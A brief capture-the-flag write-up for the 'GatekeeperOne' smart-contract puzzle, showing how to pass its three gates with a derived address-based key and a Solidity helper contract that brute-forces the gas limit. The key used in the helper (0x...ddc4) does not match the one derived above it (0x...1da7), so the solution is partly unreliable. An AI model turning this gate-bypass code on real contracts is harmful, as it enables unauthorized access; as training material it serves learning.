### Goals

Make it past the keeper

### Exploit

We need to call `enter()` with proper params to pass the modifiers and set us as entrant.

### Code

Gate 1

We need to call it through smart contract to pass this check.

Gate2

We need to figure out the uint i so `gasleft().mod(8191) == 0`

Gate 3

```code
❯ chisel
Welcome to Chisel! Type `!help` to show available commands.
➜ address a = 0x1A08f48978094D6EF3B270eFBC358b745eCD1Da7
➜ uint16(uint160(a))
Type: uint16
├ Hex: 0x1da7
├ Hex (full word): 0x0000000000000000000000000000000000000000000000000000000000001da7
└ Decimal: 7591
```

using ipython we can extract bytes8

```code
In [1]: a = '0x000000000000000000000000000000000000000000000000
   ...: 0000000000001da7'

In [2]: a[-16:]
Out[2]: '0000000000001da7'
```

now using Remix we will deploy helper contract. Finding the right `gasLimit` amount but for me it wasn't that easy tried grabbing values from debugger and adjusting `gasLimit` but it didn't work. So we could also use brutefoce for this.

```code
contract GasFinder {
    function e(GatekeeperOne a) public {
        for (uint256 i=0; i < 8191; i++)
        {
          try a.enter{gas: 20000 + i}(0x000000000000ddc4) {
            break;
          } catch {}
        }
    }
}
```
